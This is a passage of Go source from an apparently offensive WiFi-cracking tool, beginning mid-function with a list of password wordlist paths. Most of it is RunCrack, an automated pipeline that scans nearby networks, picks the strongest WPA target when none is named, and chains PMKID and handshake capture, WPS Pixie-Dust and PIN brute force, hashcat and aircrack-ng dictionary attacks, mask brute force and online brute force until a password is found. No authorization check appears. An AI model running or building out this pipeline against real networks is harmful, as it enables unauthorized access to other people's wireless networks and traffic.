		"/opt/homebrew/share/wordlists/rockyou.txt",
		filepath.Join(home, ".nowifi", "wordlists", "rockyou.txt"),
		filepath.Join(home, "wordlists", "rockyou.txt"),
		"/usr/share/wordlists/darkc0de.txt",
		"/usr/share/wordlists/wifite.txt",
		"/usr/share/john/password.lst",
		"/usr/share/wordlists/fasttrack.txt",
		"/usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt",
		"/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt",
	}

	// Also scan ~/.nowifi/wordlists/ directory for .txt files.
	nowifiWLDir := filepath.Join(home, ".nowifi", "wordlists")
	if entries, err := os.ReadDir(nowifiWLDir); err == nil {
		knownSet := make(map[string]bool, len(commonPaths))
		for _, p := range commonPaths {
			knownSet[p] = true
		}
		for _, e := range entries {
			if e.IsDir() {
				continue
			}
			ext := filepath.Ext(e.Name())
			if ext == ".txt" || ext == ".lst" {
				full := filepath.Join(nowifiWLDir, e.Name())
				if !knownSet[full] {
					commonPaths = append(commonPaths, full)
				}
			}
		}
	}

	var found []string
	for _, p := range commonPaths {
		if info, err := os.Stat(p); err == nil && info.Size() > 0 {
			found = append(found, p)
		}
	}

	return found
}

// ---------------------------------------------------------------------------
// Full cracking pipeline
// ---------------------------------------------------------------------------

// RunCrack runs the full cracking pipeline against a target.
//
// Pipeline (ordered by speed and effectiveness):
//  1. PMKID capture              -- client-less, ~60% of APs vulnerable
//  2. WPS Pixie-Dust             -- fast (5-30s), ~30% of WPS-enabled APs
//  3. SmartCrack PMKID (1-3)     -- common passwords + numeric patterns + word combos
//  4. Handshake capture           -- needs connected clients
//  5. SmartCrack handshake (1-3)  -- common passwords + numeric patterns + word combos
//  6. Dictionary attack (stage 4) -- rockyou.txt if available
//  7. WPS PIN brute force         -- slow (2-10h)
//  8. Smart brute force (stage 5) -- masks + rules for common patterns
//  9. Online brute force          -- last resort, no monitor mode needed
func RunCrack(iface, targetSSID, wordlist string, timeout time.Duration) ([]Result, error) {
	var results []Result

	// Step 1: Scan for targets.
	log.Printf("[crack] Step 1: Scanning for WiFi targets...")
	scanDuration := 10
	targets, err := ScanTargets(iface, scanDuration)
	if err != nil || len(targets) == 0 {
		results = append(results, Result{
			Method:  PMKID,
			Success: false,
			Details: "No WiFi networks found. Check interface and WiFi connection.",
		})
		return results, nil
	}

	// Step 2: Select target.
	var target *WifiTarget
	if targetSSID != "" {
		for i := range targets {
			if strings.EqualFold(targets[i].SSID, targetSSID) {
				target = &targets[i]
				break
			}
		}
		if target == nil {
			ssids := make([]string, 0, 10)
			for i := 0; i < len(targets) && i < 10; i++ {
				ssids = append(ssids, targets[i].SSID)
			}
			results = append(results, Result{
				Method:  PMKID,
				Success: false,
				Details: fmt.Sprintf("Target SSID '%s' not found. Visible networks: %s", targetSSID, strings.Join(ssids, ", ")),
			})
			return results, nil
		}
	} else {
		// Pick WPA/WPA2 target with strongest signal.
		for i := range targets {
			sec := strings.ToLower(targets[i].Security)
			if strings.Contains(sec, "wpa") || strings.Contains(sec, "wpa2") {
				target = &targets[i]
				break
			}
		}
		if target == nil {
			target = &targets[0]
		}
	}

	log.Printf("[crack] Target: %s (%s) ch=%d signal=%ddBm", target.SSID, target.BSSID, target.Channel, target.Signal)

	// Enrich target with WPS info if not already set.
	if !target.WPSEnabled {
		wpsTargets := ScanWPSTargets(iface, 10*time.Second)
		for _, wt := range wpsTargets {
			if strings.EqualFold(wt.BSSID, target.BSSID) {
				target.WPSEnabled = wt.WPSEnabled
				target.WPSLocked = wt.WPSLocked
				target.WPSVersion = wt.WPSVersion
				break
			}
		}
	}

	// Collect hash files for SmartCrack stages later.
	var hashFiles []string

	// Step 3: Try PMKID capture (client-less, most effective).
	log.Printf("[crack] Step 3: PMKID capture...")
	pmkidResult, _ := CapturePMKID(*target, iface, timeout)
	if pmkidResult != nil {
		results = append(results, *pmkidResult)
		if pmkidResult.Success && pmkidResult.CaptureFile != "" {
			hashFiles = append(hashFiles, pmkidResult.CaptureFile)
		}
	}

	// Step 4: WPS Pixie-Dust (fast, try before slow hashcat).
	if target.WPSEnabled && !target.WPSLocked {
		log.Printf("[crack] Step 4: WPS Pixie-Dust...")
		pixieTimeout := timeout
		if pixieTimeout > 5*time.Minute {
			pixieTimeout = 5 * time.Minute
		}
		pixieResult, _ := CrackWPSPixie(*target, iface, pixieTimeout)
		if pixieResult != nil {
			results = append(results, *pixieResult)
			if pixieResult.Success && pixieResult.Password != "" {
				return results, nil
			}
		}
	}

	// Step 5: SmartCrack stages 1-3 on PMKID hash (common passwords + patterns).
	for _, hashFile := range hashFiles {
		log.Printf("[crack] Step 5: SmartCrack (stages 1-3) on PMKID hash...")
		smartTimeout := min(15*time.Minute, timeout)
		smartResult, _ := smartCrackWithOptions(hashFile, smartTimeout, smartCrackOptions{
			startStage: smartCrackStageCommonPasswords,
			endStage:   smartCrackStageWordNumberRules,
		})
		if smartResult != nil {
			results = append(results, *smartResult)
			if smartResult.Success {
				return results, nil
			}
		}
	}

	// Step 6: Try handshake capture (needs clients).
	log.Printf("[crack] Step 6: Handshake capture...")
	hsResult, _ := CaptureHandshake(*target, iface, timeout)
	if hsResult != nil {
		results = append(results, *hsResult)
		if hsResult.Success && hsResult.CaptureFile != "" {
			hashFiles = append(hashFiles, hsResult.CaptureFile)

			// Step 7: SmartCrack stages 1-3 on handshake hash.
			log.Printf("[crack] Step 7: SmartCrack (stages 1-3) on handshake hash...")
			smartTimeout := min(15*time.Minute, timeout)
			smartResult, _ := smartCrackWithOptions(hsResult.CaptureFile, smartTimeout, smartCrackOptions{
				startStage: smartCrackStageCommonPasswords,
				endStage:   smartCrackStageWordNumberRules,
			})
			if smartResult != nil {
				results = append(results, *smartResult)
				if smartResult.Success {
					return results, nil
				}
			}
		}
	}

	// Step 8: Dictionary attack (stage 4) on all hash files.
	if len(hashFiles) > 0 {
		log.Printf("[crack] Step 8: Dictionary attack (rockyou.txt)...")
		for _, hashFile := range hashFiles {
			dictResult, _ := crackWithHashcatMode(hashFile, "dictionary", wordlist, min(30*time.Minute, timeout))
			if dictResult != nil {
				results = append(results, *dictResult)
				if dictResult.Success {
					return results, nil
				}
			}
			// Also try aircrack-ng as CPU fallback.
			aircrackResult, _ := crackWithAircrackTimeout(hashFile, wordlist, min(30*time.Minute, timeout))
			if aircrackResult != nil {
				results = append(results, *aircrackResult)
				if aircrackResult.Success {
					return results, nil
				}
			}
		}
	}

	// Step 9: WPS PIN brute force (slow -- 2-10 hours).
	if target.WPSEnabled && !target.WPSLocked {
		log.Printf("[crack] Step 9: WPS PIN brute force...")
		pinTimeout := timeout * 4
		if pinTimeout > time.Hour {
			pinTimeout = time.Hour
		}
		pinResult, _ := CrackWPSPin(*target, iface, pinTimeout)
		if pinResult != nil {
			results = append(results, *pinResult)
			if pinResult.Success {
				return results, nil
			}
		}
	}

	// Step 10: Smart brute force (stage 5) -- masks + rules, hours.
	if len(hashFiles) > 0 {
		log.Printf("[crack] Step 10: Smart brute force (masks + rules)...")
		for _, hashFile := range hashFiles {
			bruteTimeout := min(2*time.Hour, timeout)
			bruteResult, _ := smartCrackWithOptions(hashFile, bruteTimeout, smartCrackOptions{
				startStage: smartCrackStageSmartBrute,
				endStage:   smartCrackStageSmartBrute,
			})
			if bruteResult != nil {
				results = append(results, *bruteResult)
				if bruteResult.Success {
					return results, nil
				}
			}
		}
	}

	// Step 11: Online brute force (last resort, no monitor mode needed).
	log.Printf("[crack] Step 11: Online brute force (last resort)...")
	onlineTimeout := min(1*time.Hour, timeout)
	onlineResult, _ := OnlineBruteForce(*target, iface, onlineTimeout)
	if onlineResult != nil {
		results = append(results, *onlineResult)
	}

	return results, nil
}

// ---------------------------------------------------------------------------
// Internal helpers
// ---------------------------------------------------------------------------

// runWithTimeout runs a command with a timeout and returns its stdout.
func runWithTimeout(binary string, args []string, timeout time.Duration) string {
	cmd := exec.CommandContext(context.Background(), binary, args...)
	return runCmdWithTimeout(cmd, timeout)
}

// runCmdWithTimeout starts a command and waits up to timeout, returning stdout.
func runCmdWithTimeout(cmd *exec.Cmd, timeout time.Duration) string {
	if cmd.Stdout != nil {
		// Already configured; don't override.
		_ = cmd.Run()
		return ""
	}

	out, err := runCmdBytes(cmd, timeout)
	if err != nil {
		return string(out)
	}
	return string(out)
}

// runCmdBytes starts a command, waits for it with a timeout, and returns combined output.
func runCmdBytes(cmd *exec.Cmd, timeout time.Duration) ([]byte, error) {
	var buf strings.Builder
	cmd.Stdout = &buf
	cmd.Stderr = &buf

	if err := cmd.Start(); err != nil {
		return nil, err
	}

	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()

	select {
	case err := <-done:
		return []byte(buf.String()), err
	case <-time.After(timeout):
		_ = cmd.Process.Signal(os.Interrupt)
		select {
		case <-done:
		case <-time.After(5 * time.Second):
			_ = cmd.Process.Kill()
			<-done
		}
		return []byte(buf.String()), fmt.Errorf("%w after %v", errCommandTimedOut, timeout)
	}
}

// countFileLines counts non-empty lines in a file.
func countFileLines(path string) int {
	data, err := os.ReadFile(path)
	if err != nil {
		return 0
	}
	count := 0
	for _, line := range strings.Split(string(data), "\n") {
		if strings.TrimSpace(line) != "" {
			count++
		}
	}
	return count
}
